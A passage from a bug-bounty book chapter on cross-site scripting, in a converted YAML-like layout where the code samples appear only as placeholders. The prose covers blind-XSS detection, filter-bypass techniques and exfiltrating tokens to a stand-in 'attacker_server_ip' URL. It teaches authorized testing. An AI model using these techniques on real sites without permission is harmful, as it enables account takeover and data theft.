    the application escapes and which get rendered directly. Then you can construct
    test XSS payloads from the characters that you know the application isn’t properly
    sanitizing.'
  prefs: []
  type: TYPE_NORMAL
- en: 'Blind XSS flaws are harder to detect; since you can’t detect them by looking
    for reflected input, you can’t test for them by trying to generate an alert box.
    Instead, try making the victim’s browser generate a request to a server you own.
    For example, you can submit the following payload, which will make the victim’s
    browser request the page */xss* on your server:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE31]'
  prefs: []
  type: TYPE_PRE
- en: Then, you can monitor your server logs to see if anyone requests that page.
    If you see a request to the path */xss*, a blind XSS has been triggered! Tools
    like XSS Hunter ([https://xsshunter.com/features](https://xsshunter.com/features))
    can automate this process. We’ll also talk more about setting up a server to test
    for multiple types of vulnerabilities in Chapter 13.
  prefs: []
  type: TYPE_NORMAL
- en: Finally, although hackers typically discover new XSS vectors manually, a good
    way to automatically test a site for already-known XSS vectors is through fuzzing.
    We’ll talk about fuzzing and automatic bug finding in Chapter 25.
  prefs: []
  type: TYPE_NORMAL
- en: 'Step 3: Confirm the Impact'
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: Check for your payload on the destination page. If you’re using an alert function,
    was a pop-up box generated on the page? If you’re using a `location` payload,
    did your browser redirect you offsite?
  prefs: []
  type: TYPE_NORMAL
- en: Be aware that sites might also use user input to construct something other than
    the next returned web page. Your input could show up in future web pages, email,
    and file portals. A time delay also might occur between when the payload is submitted
    and when the user input is rendered. This situation is common in log files and
    analytics pages. If you’re targeting these, your payload might not execute until
    later, or in another user’s account. And certain XSS payloads will execute under
    only certain contexts, such as when an admin is logged in or when the user actively
    clicks, or hovers over, certain HTML elements. Confirm the impact of the XSS payload
    by browsing to the necessary pages and performing those actions.
  prefs: []
  type: TYPE_NORMAL
- en: Bypassing XSS Protection
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: Most applications now implement some sort of XSS protection in their input fields.
    Often, they’ll use a blocklist to filter out dangerous expressions that might
    be indicative of XSS. Here are some strategies for bypassing this type of protection.
  prefs: []
  type: TYPE_NORMAL
- en: Alternative JavaScript Syntax
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: 'Often, applications will sanitize `<script>` tags in user input. If that is
    the case, try executing XSS that doesn’t use a `<script>` tag. For example, remember
    that in certain scenarios, you can specify JavaScript to run in other types of
    tags. When you try to construct an XSS payload, you can also try to insert code
    into HTML tag names or attributes instead. Say user input is passed into an HTML
    image tag, like this:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE32]'
  prefs: []
  type: TYPE_PRE
- en: Instead of closing out the image tag and inserting a script tag, like this
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE33]'
  prefs: []
  type: TYPE_PRE
- en: 'you can insert the JavaScript code directly as an attribute to the current
    tag:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE34]'
  prefs: []
  type: TYPE_PRE
- en: 'Another way of injecting code without the `<script>` tag is to use the special
    URL schemes mentioned before. This snippet will create a Click me! link that will
    generate an alert box when clicked:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE35]'
  prefs: []
  type: TYPE_PRE
- en: Capitalization and Encoding
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: 'You can also mix different encodings and capitalizations to confuse the XSS
    filter. For example, if the filter filters for only the string `"script"`, capitalize
    certain letters in your payload. Since browsers often parse HTML code permissively
    and will allow for minor syntax issues like capitalization, this won’t affect
    how the script tag is interpreted:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE36]'
  prefs: []
  type: TYPE_PRE
- en: 'If the application filters special HTML characters, like single and double
    quotes, you can’t write any strings into your XSS payload directly. But you could
    try using the JavaScript `fromCharCode()` function, which maps numeric codes to
    the corresponding ASCII characters, to create the string you need. For example,
    this piece of code is equivalent to the string `"http://attacker_server_ip/?c="`:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE37]'
  prefs: []
  type: TYPE_PRE
- en: 'This means you can construct an XSS payload without quotes, like this:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE38]'
  prefs: []
  type: TYPE_PRE
- en: 'The `String.fromCharCode()` function returns a string, given an input list
    of ASCII character codes. You can use this piece of code to translate your exploit
    string to an ASCII number sequence by using an online JavaScript editor, like
    *https://js.do/*, to run the JavaScript code or by saving it into an HTML file
    and loading it in your browser:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE39]'
  prefs: []
  type: TYPE_PRE
- en: 'The `ascii()` function 1 converts characters to their ASCII numeric representation.
    We run each character in the input string through `ascii()` 2. Finally, we write
    the translated string to the document 3. Let’s translate the payload `http://attacker_server_ip/?c=`
    by using this code:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE40]'
  prefs: []
  type: TYPE_PRE
- en: This JavaScript code should print out `"104, 116, 116, 112, 58, 47, 47, 97,
    116, 116, 97, 99, 107, 101, 114, 95, 115, 101, 114, 118, 101, 114, 95, 105, 112,
    47, 63, 99, 61"`. You can then use it to construct your payload by using the `fromCharCode()`
    method.
  prefs: []
  type: TYPE_NORMAL
- en: Filter Logic Errors
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: 'Finally, you could exploit any errors in the filter logic. For example, sometimes
    applications remove all `<script>` tags in the user input to prevent XSS, but
    do it only once. If that’s the case, you can use a payload like this:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE41]'
  prefs: []
  type: TYPE_PRE
- en: 'Notice that each `<script>` tag cuts another `<script>` tag in two. The filter
    won’t recognize those broken tags as legitimate, but once the filter removes the
    intact tags from this payload, the rendered input becomes a perfectly valid piece
    of JavaScript code:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE42]'
  prefs: []
  type: TYPE_PRE
- en: These are just a handful of the filter-bypass techniques that you can try. XSS
    protection is difficult to do right, and hackers are constantly coming up with
    new techniques to bypass protection. That’s why hackers are still constantly finding
    and exploiting XSS issues in the wild. For more filter-bypass ideas, check out
    OWASP’s XSS filter evasion cheat sheet ([https://owasp.org/www-community/xss-filter-evasion-cheatsheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)).
    You can also simply Google for *XSS filter bypass* for more interesting articles.
  prefs: []
  type: TYPE_NORMAL
- en: Escalating the Attack
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: The impact of XSS varies because of several factors. For instance, the type
    of XSS determines the number of users who could be affected. Stored XSS on a public
    forum can realistically attack anyone who visits that forum page, so stored XSS
    is considered the most severe. On the other hand, reflected or DOM XSS can affect
    only users who click the malicious link, and self-XSS requires a lot of user interaction
    and social engineering to execute, so they are normally considered lower impact.
  prefs: []
  type: TYPE_NORMAL
- en: The identities of the affected users matter too. Let’s say a stored XSS vulnerability
    is on a site’s server logs. The XSS can affect system administrators and allow
    attackers to take over their sessions. Since the affected users are accounts of
    high privilege, the XSS can compromise the integrity of the entire application.
    You might gain access to customer data, internal files, and API keys. You might
    even escalate the attack into RCE by uploading a shell or execute scripts as the
    admin.
  prefs: []
  type: TYPE_NORMAL
- en: If, instead, the affected population is the general user base, XSS allows attackers
    to steal private data like cookies and session tokens. This can allow attackers
    to hijack any user’s session and take over the associated account.
  prefs: []
  type: TYPE_NORMAL
- en: Most of the time, XSS can be used to read sensitive information on the victim’s
    page. Since scripts executed during an XSS attack run as the target page, the
    script is able to access any information on that page. This means that you can
    use XSS to steal data and escalate your attack from there. This can be done by
    running a script that sends the data back to you. For example, this code snippet
    reads the CSRF token embedded on the victim’s page and sends it to the attacker’s
    server as a URL parameter named `token`. If you can steal a user’s CSRF tokens,
    you can execute actions on their behalf by using those tokens to bypass CSRF protection
    on the site. (See Chapter 9 for more on CSRF.)
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE43]'
  prefs: []
  type: TYPE_PRE
- en: XSS can also be used to dynamically alter the page the victim sees, so you can
    replace the page with a fake login page and trick the user into giving you their
    credentials (often called *phishing*). XSS can also allow attackers to automatically
    redirect the victim to malicious pages and perform other harmful operations while
    posing as the legit site, such as installing malware. Before reporting the XSS
    you found, make sure to assess the full impact of that particular XSS to include
    in your vulnerability report.
  prefs: []
  type: TYPE_NORMAL
- en: Automating XSS Hunting
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: XSS hunting can be time-consuming. You might spend hours inspecting different
    request parameters and never find any XSS. Fortunately, you can use tools to make
    your work more efficient.
  prefs: []
  type: TYPE_NORMAL
- en: First, you can use browser developer tools to look for syntax errors and troubleshoot
    your payloads. I also like to use my proxy’s search tool to search server responses
    for reflected input. Finally, if the program you are targeting allows automatic
    testing, you can use Burp intruder or other fuzzers to conduct an automatic XSS
    scan on your target. We will talk about this in Chapter 25.
  prefs: []
  type: TYPE_NORMAL
- en: Finding Your First XSS!
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: 'Jump right into hunting for your first XSS! Choose a target and follow the
    steps we covered in this chapter:'
  prefs: []
  type: TYPE_NORMAL
- en: Look for user input opportunities on the application. When user input is stored
    and used to construct a web page later, test the input field for stored XSS. If
    user input in a URL gets reflected back on the resulting web page, test for reflected
    and DOM XSS.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Insert XSS payloads into the user input fields you’ve found. Insert payloads
    from lists online, a polyglot payload, or a generic test string.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Confirm the impact of the payload by checking whether your browser runs your
    JavaScript code. Or in the case of a blind XSS, see if you can make the victim
    browser generate a request to your server.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: If you can’t get any payloads to execute, try bypassing XSS protections.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Automate the XSS hunting process with techniques introduced in Chapter 25.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Consider the impact of the XSS you’ve found: who does it target? How many users
    can it affect? And what can you achieve with it? Can you escalate the attack by
    using what you’ve found?'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Send your first XSS report to a bug bounty program!
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
